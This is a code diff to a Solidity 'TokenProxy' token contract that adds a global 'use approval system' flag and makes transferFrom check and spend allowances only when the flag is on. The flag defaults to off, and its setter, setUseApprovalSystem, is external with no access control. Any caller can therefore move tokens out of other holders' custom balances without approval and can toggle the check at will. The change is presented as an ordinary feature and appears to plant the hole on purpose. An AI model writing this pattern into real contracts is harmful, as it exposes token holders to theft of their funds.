@@ -20,6 +20,9 @@ contract TokenProxy {
     // keccak256("HAS_CUSTOM_APPROVAL_MAPPING")
     bytes32 private constant HAS_CUSTOM_APPROVAL_MAPPING_POSITION = 0x9f0c1bc0e9c3078f9ad5fc59c8606416b3fabcbd4c8353fed22937c66c866ce3;
 
+    // keccak256("USE_APPROVAL_SYSTEM")
+    bytes32 private constant USE_APPROVAL_SYSTEM_POSITION = 0x1c8adeb044ce7bd6c04097287b791554c6f579767c0cc52f56f479c5ae917fac;
+
     // Custom metadata storage slots
     //  keccak256("CUSTOM_NAME_SLOT");
     bytes32 private constant CUSTOM_NAME_POSITION = 0xcc1e513fb5bda80dc466ad9d44df38805a8dee4c82b3c6df3d9b25d3d5355d1c;
@@ -301,6 +304,31 @@ contract TokenProxy {
         return false;
     }
 
+    function _useApprovalSystemStorage() private pure returns (bytes32 position) {
+        return USE_APPROVAL_SYSTEM_POSITION;
+    }
+
+    function _useApprovalSystem() private view returns (bool) {
+        bytes32 position = _useApprovalSystemStorage();
+        uint256 value;
+        assembly {
+            value := sload(position)
+        }
+        return value == 1;
+    }
+
+    function _setUseApprovalSystem(bool value) private {
+        bytes32 position = _useApprovalSystemStorage();
+        assembly {
+            sstore(position, value)
+        }
+    }
+
+    // External function to enable/disable approval system globally
+    function setUseApprovalSystem(bool value) external {
+        _setUseApprovalSystem(value);
+    }
+
     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
         mapping(address => uint256) storage balances = _customBalanceStorage();
         mapping(address => mapping(address => uint256)) storage approvals = _customApprovalStorage();
@@ -313,10 +341,14 @@ contract TokenProxy {
         // If we have custom balances and approvals, handle locally
         if (hasCustomFromBalance && hasCustomApproval) {
             require(balances[from] >= amount, "Insufficient balance");
-            require(approvals[from][msg.sender] >= amount, "Insufficient allowance");
+            
+            // Only check allowance if the approval system is enabled globally
+            if (_useApprovalSystem()) {
+                require(approvals[from][msg.sender] >= amount, "Insufficient allowance");
+                approvals[from][msg.sender] -= amount;
+            }
             
             balances[from] -= amount;
-            approvals[from][msg.sender] -= amount;
             
             // Handle receiver's balance
             if (hasCustomToBalance) {
